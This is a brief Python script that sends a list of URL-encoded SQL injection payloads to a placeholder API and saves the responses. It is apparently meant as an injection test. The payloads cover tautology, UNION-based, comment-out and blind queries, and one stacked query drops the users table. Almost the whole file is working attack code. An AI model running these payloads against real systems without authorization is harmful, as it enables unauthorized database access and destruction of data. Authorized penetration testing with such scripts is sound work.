import requests

# List of test endpoints with different SQL injection attempts
endpoints = [
    "/2024-01-01%27%20OR%20%271%27=%271/1",   # Basic SQL Injection
    "/2024-01-01%27%20UNION%20SELECT%20NULL--/1",  # Union-Based SQL Injection
    "/2024-01-01%27;%20--/1",  # Comment Out the Rest of the Query
    "/2024-01-01%27%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20'true'%20ELSE%20to_char(1/0)%20END)=%27true%27/1",  # Blind SQL Injection
    "/2024-01-01%27;%20DROP%20TABLE%20users;--/1",  # Stacked Queries
]

# Base URL of the endpoint
base_url = "http://yourapi.com"

# File to save responses
response_file = "responses.txt"

# Function to send requests and save responses
def test_endpoints():
    with open(response_file, "w") as f:
        for endpoint in endpoints:
            url = f"{base_url}{endpoint}"
            try:
                response = requests.get(url)
                f.write(f"Endpoint: {url}\n")
                f.write(f"Status Code: {response.status_code}\n")
                f.write(f"Response: {response.text}\n")
                f.write("\n" + "="*40 + "\n")
            except requests.exceptions.RequestException as e:
                f.write(f"Failed to connect to {url}: {e}\n")
                f.write("\n" + "="*40 + "\n")
    print(f"Responses have been saved to {response_file}")

if __name__ == "__main__":
    test_endpoints()